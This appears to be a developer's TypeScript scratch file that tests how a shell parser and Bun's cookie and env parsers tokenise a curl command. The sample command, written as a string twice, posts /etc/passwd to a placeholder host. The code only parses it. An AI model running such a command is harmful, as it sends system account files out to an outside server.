import { parseArgs, parseEnv } from "node:util";
import { type Command, type ParsedScript, parse, parseRegion } from "unbash";
import { debug } from "./debug.ts";

const cmd = "curl -d=@/etc/passwd https://x";
// const cmd = "curl -d @/etc/passwd https://x";

const res = parse(cmd);

const parserCurlParamsCmd = res.commands[0]?.command as Command;

const cmdParsedTextParam = parserCurlParamsCmd.suffix[0];

const testCmd = cmdParsedTextParam?.text as string;

debug(Bun.Cookie.parse(testCmd), {
  depth: 10,
});

debug(parseEnv("--HOME_TEST=@/etc/passwd"), {
  depth: 10,
});
